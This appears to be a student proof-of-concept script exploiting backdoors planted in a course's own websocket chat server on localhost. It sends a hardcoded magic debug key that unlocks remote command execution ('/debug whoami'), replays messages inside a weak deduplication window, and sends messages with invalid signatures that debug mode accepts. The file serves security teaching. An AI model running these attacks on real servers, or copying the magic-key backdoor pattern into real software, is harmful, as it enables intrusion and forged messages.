# exploit_poc.py - Proof of Concept exploits for backdoors
# Group: [Your Group Name]
# Members: [Your Names]
# WARNING: FOR EDUCATIONAL PURPOSES ONLY - RUN IN ISOLATED VM

import asyncio
import websockets
import json
import time
import base64
from common import now_ms, new_uuid, b64url_encode, canonical_json
from crypto_socp import gen_rsa4096_pair, export_pub_b64url, sign_pss

class ExploitClient:
    def __init__(self):
        self.PRIV, self.PUB = gen_rsa4096_pair()
        self.PUB_B64 = export_pub_b64url(self.PUB)
        self.user_id = new_uuid()

    async def exploit_debug_mode(self, server_url):
        """Exploit #1: Activate debug mode and execute commands"""
        print("[*] Attempting to exploit debug mode backdoor...")

        async with websockets.connect(server_url) as ws:
            # Connect with debug trigger in meta field
            hello = {
                "type": "USER_HELLO",
                "from": self.user_id,
                "to": "server",
                "ts": now_ms(),
                "payload": {
                    "client": "exploit-client",
                    "pubkey": self.PUB_B64,
                    "meta": {"debug_key": "d3bug_m0d3_3nabl3d"}  # Magic trigger
                },
                "sig": ""
            }
            await ws.send(json.dumps(hello))

            # Wait for ACK
            response = await ws.recv()
            print(f"[+] Received: {json.loads(response)['type']}")

            # Now send command injection
            cmd_payload = {
                "type": "CLIENT_CMD",
                "from": self.user_id,
                "to": "server",
                "ts": now_ms(),
                "payload": {"cmd": "/debug whoami"},  # Execute system command
                "sig": ""
            }
            cmd_payload["sig"] = b64url_encode(
                sign_pss(self.PRIV, canonical_json(cmd_payload["payload"]))
            )
            await ws.send(json.dumps(cmd_payload))

            # Get command output
            output = await ws.recv()
            output_data = json.loads(output)
            if output_data["type"] == "DEBUG_OUTPUT":
                decoded = base64.b64decode(output_data["payload"]["output"]).decode()
                print(f"[+] Command executed successfully!")
                print(f"[+] Output: {decoded}")
            else:
                print(f"[-] Unexpected response: {output_data}")

    async def exploit_replay_attack(self, server_url, victim_id, target_id):
        """Exploit #2: Replay attack using weak dedup window"""
        print("[*] Attempting replay attack exploit...")

        async with websockets.connect(server_url) as ws:
            # Connect normally
            hello = {
                "type": "USER_HELLO",
                "from": self.user_id,
                "to": "server",
                "ts": now_ms(),
                "payload": {"client": "exploit-client", "pubkey": self.PUB_B64},
                "sig": ""
            }
            await ws.send(json.dumps(hello))
            await ws.recv()  # ACK

            # Craft a message to replay
            original_ts = now_ms()
            msg = {
                "type": "MSG_DIRECT",
                "from": victim_id,
                "to": target_id,
                "ts": original_ts,
                "payload": {
                    "ciphertext": "fake_encrypted_data",
                    "sender": victim_id,
                    "sender_pub": self.PUB_B64,
                    "content_sig": "fake_signature"
                },
                "sig": ""
            }

            # Send message multiple times within replay window
            print("[+] Sending original message...")
            await ws.send(json.dumps(msg))

            # Wait just under the dedup window
            await asyncio.sleep(4.5)

            # Replay the same message
            print("[+] Replaying message after window...")
            await ws.send(json.dumps(msg))
            print("[+] Replay attack completed - message may have been processed twice")

    async def exploit_signature_bypass(self, server_url):
        """Exploit #3: Bypass signature verification in debug mode"""
        print("[*] Attempting signature bypass exploit...")

        async with websockets.connect(server_url) as ws:
            # First activate debug mode
            hello = {
                "type": "USER_HELLO",
                "from": self.user_id,
                "to": "server",
                "ts": now_ms(),
                "payload": {
                    "client": "exploit-client",
                    "pubkey": self.PUB_B64,
                    "meta": {"debug_key": "d3bug_m0d3_3nabl3d"}
                },
                "sig": ""
            }
            await ws.send(json.dumps(hello))
            await ws.recv()  # ACK

            # Send message with invalid signature
            msg = {
                "type": "MSG_DIRECT",
                "from": self.user_id,
                "to": "target-user",
                "ts": now_ms(),
                "payload": {
                    "ciphertext": "fake_data",
                    "sender": self.user_id,
                    "sender_pub": self.PUB_B64,
                    "content_sig": "INVALID_SIGNATURE"  # Invalid signature
                },
                "sig": "ALSO_INVALID"
            }

            print("[+] Sending message with invalid signature...")
            await ws.send(json.dumps(msg))

            # In debug mode, this should be accepted
            print("[+] Message sent - signature verification bypassed in debug mode")

async def main():
    exploit = ExploitClient()
    server_url = "ws://127.0.0.1:9001"

    print("=== SOCP Backdoor Exploit PoC ===\n")

    # Run exploits
    try:
        await exploit.exploit_debug_mode(server_url)
        print()
        await exploit.exploit_replay_attack(server_url, "victim-id", "target-id")
        print()
        await exploit.exploit_signature_bypass(server_url)
    except Exception as e:
        print(f"[-] Exploit failed: {e}")

if __name__ == "__main__":
    print("[!] WARNING: Run this only in an isolated VM environment")
    print("[!] This is for educational purposes only\n")
    asyncio.run(main())